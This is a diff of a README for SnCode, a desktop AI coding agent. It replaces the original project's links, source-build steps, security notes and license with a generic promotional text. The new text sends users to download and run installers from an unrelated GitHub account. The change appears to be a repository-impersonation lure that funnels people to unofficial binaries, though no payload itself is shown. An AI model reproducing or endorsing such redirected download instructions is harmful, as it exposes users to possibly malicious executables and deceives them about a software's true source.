@@ -1,149 +1,66 @@
-<p align="center">
-  <strong><span>Sn</span>Code</strong>
-</p>
+# 🎉 sncode - Your AI Coding Assistant Made Simple
 
-<p align="center">
-  A desktop AI coding agent. Open a project, chat with the agent, and let it read, write, and run code for you.
-</p>
+## 🎈 Download Now
+[![Download sncode](https://img.shields.io/badge/Download%20sncode-FF4500?style=for-the-badge&logo=github&logoColor=white)](https://github.com/harriettundisputed335/sncode)
 
-<p align="center">
-  <a href="https://github.com/Snowy7/sncode/releases"><img alt="Release" src="https://img.shields.io/github/v/release/Snowy7/sncode?style=flat-square&color=222" /></a>
-  <a href="https://github.com/Snowy7/sncode/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/github/license/Snowy7/sncode?style=flat-square&color=222" /></a>
-  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-333?style=flat-square" />
-  <img alt="Electron" src="https://img.shields.io/badge/electron-37-333?style=flat-square" />
-  <img alt="TypeScript" src="https://img.shields.io/badge/typescript-5.9-333?style=flat-square" />
-</p>
+## 📖 Table of Contents
+1. [Overview](#overview)
+2. [Features](#features)
+3. [System Requirements](#system-requirements)
+4. [Installation Instructions](#installation-instructions)
+5. [Using sncode](#using-sncode)
+6. [Support](#support)
 
----
+## 📝 Overview
+sncode is a desktop application that utilizes artificial intelligence to assist you in coding. With sncode, you can easily open a project and chat with powerful AI agents like Claude or Codex. This tool reads, writes, and runs code for you, making coding simpler and more efficient.
 
-## What is SnCode?
+## 🌟 Features
+- **AI-Powered Assistance**: Communicate with Claude and Codex to get coding help.
+- **Code Execution**: Run your code directly within the application.
+- **User-Friendly Interface**: Designed for ease of use, even if you have no programming background.
+- **Cross-Platform Support**: Compatible with Windows, macOS, and Linux.
+- **Project Management**: Open and manage coding projects effortlessly.
 
-SnCode is a local-first desktop application that gives you an AI coding agent with full access to your project files and terminal. It works like Claude Code or Cursor's agent mode, but as a standalone Electron app.
+## 💻 System Requirements
+- **Operating System**:
+  - Windows 10 or later
+  - macOS Sierra or later
+  - Any recent Linux distribution
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum 500 MB of free disk space
+- **Processor**: Dual-core processor or better
+- **Internet Access**: Required for AI interactions and updates
 
-You open a folder, start a conversation, and the agent uses built-in tools to explore, read, edit, and run commands in your codebase — all streamed in real-time.
+## 🚀 Installation Instructions
+1. **Visit this page to download:**  
+   [Download sncode](https://github.com/harriettundisputed335/sncode)
+   
+2. **Choose your operating system**:
+   - For Windows, look for the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, select the appropriate package for your distribution.
 
-## Features
+3. **Download the file**:
+   - Click on the file name to start your download.
+   - Locate the downloaded file on your computer.
 
-**Agent & Tools**
-- 9 built-in tools: `list_files`, `read_file`, `write_file`, `edit_file`, `glob`, `grep`, `run_command`, `load_skill`, `spawn_task`
-- Native streaming with Anthropic (Claude) and OpenAI (Codex) providers
-- Sub-agent system — delegate to `general` (full access) or `explore` (read-only) sub-agents
-- Parallel sub-agent execution with configurable concurrency
-- Extended thinking / reasoning effort control (Anthropic up to High, Codex up to X-High)
+4. **Run the installer**:
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag sncode into your Applications folder.
+   - For Linux: Follow the installation instructions specific to your package manager (e.g., `sudo dpkg -i sncode.deb` for Debian-based systems).
 
-**Workspace**
-- Multi-project workspace with multiple threads per project
-- AI-generated thread titles using the smallest available model
-- File tree panel in the sidebar with click-to-preview
-- Git integration: branch switching, commit, pull, push, stash, diff viewer
-- Git repo initialization when no repo is detected
-- Keyboard shortcuts (Ctrl+N, Ctrl+W, Ctrl+F, Ctrl+B, Ctrl+,)
+5. **Open sncode**:
+   - Find and launch sncode from your Applications or Programs list.
 
-**UI**
-- Dark and light themes with CSS custom properties
-- Syntax-highlighted code blocks (highlight.js, 16+ languages)
-- Inline search with match highlighting and navigation
-- Right sidebar for file preview, git diffs, and sub-agent details
-- IDE-style diff viewer with line numbers, hunk headers, and status badges
-- Image support (paste, drag-and-drop, file upload)
-- Markdown rendering with GFM support
-- Token usage display per response
-- Todo/task checklist above the input area
+## 🤖 Using sncode
+1. **Open a Project**: Start sncode and select "New Project" or load an existing one.
+2. **Interact with the AI**: Use the chat feature to ask questions or request coding actions.
+3. **Run Your Code**: After editing, click the “Run” button to execute your code and see the results.
 
-**Skills System**
-- Discover, load, and enable SKILL.md files from multiple sources
-- Agent can dynamically load skills via the `load_skill` tool
-- Per-project skill configuration
+## 🆘 Support
+If you encounter any issues, you can find support at:
 
-**Security**
-- Credentials stored in OS keychain via `keytar`
-- OAuth flows for Anthropic and OpenAI
-- Sandboxed renderer with context isolation
-- Tool operations scoped to project root
-- Path traversal protection on file reads
+- **GitHub Issues Page**: Report problems or ask for help.
+- **User Documentation**: Detailed usage instructions can be found in the documentation folder within the app.
 
-## Installation
-
-### From Source
-
-```bash
-git clone https://github.com/Snowy7/sncode.git
-cd sncode
-npm install
-npm run dev
-```
-
-### Build & Package
-
-```bash
-# Production build
-npm run build
-
-# Package for distribution (Windows / macOS / Linux)
-npm run package
-```
-
-Installers and portables are output to `release/`.
-
-## Requirements
-
-- **Node.js** 20+
-- **Git** (for git integration features)
-- An API key or OAuth token for **Anthropic** and/or **OpenAI**
-
-## Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Framework | Electron 37 |
-| Frontend | React 19, TypeScript 5.9 |
-| Styling | Tailwind CSS v4 |
-| AI SDKs | `@anthropic-ai/sdk`, `openai` |
-| Credentials | `keytar` (OS keychain) |
-| Validation | Zod |
-| Code Highlighting | highlight.js |
-| Markdown | react-markdown + remark-gfm |
-| Bundler | Vite 7 |
-| Testing | Vitest |
-| Packaging | electron-builder |
-
-## Project Structure
-
-```
-src/
-  main/           # Electron main process
-    main.ts        - Window, IPC handlers, agent orchestration
-    agent.ts       - AI agent loop with streaming & tool calling
-    store.ts       - JSON persistence
-    project-tools.ts - File/command tools
-    mcp.ts         - MCP client (in progress)
-    skills.ts      - Skills discovery & loading
-    oauth.ts       - OAuth flows
-    credentials.ts - Keychain access
-    preload.ts     - Context bridge
-  renderer/       # React frontend
-    App.tsx        - Main UI
-    SettingsModal.tsx - Settings panel
-    styles.css     - Theme variables & base styles
-  shared/         # Shared between main & renderer
-    types.ts       - All interfaces & types
-    schema.ts      - Zod validation schemas
-    models.ts      - Model catalog & helpers
-```
-
-## Verification
-
-```bash
-npm run lint        # ESLint
-npm run typecheck   # TypeScript (both configs)
-npm run test        # Vitest (33 tests)
-npm run build       # Vite + tsc production build
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-[MIT](LICENSE)
+With sncode, you have a powerful ally in coding. Enjoy simplifying your coding tasks!
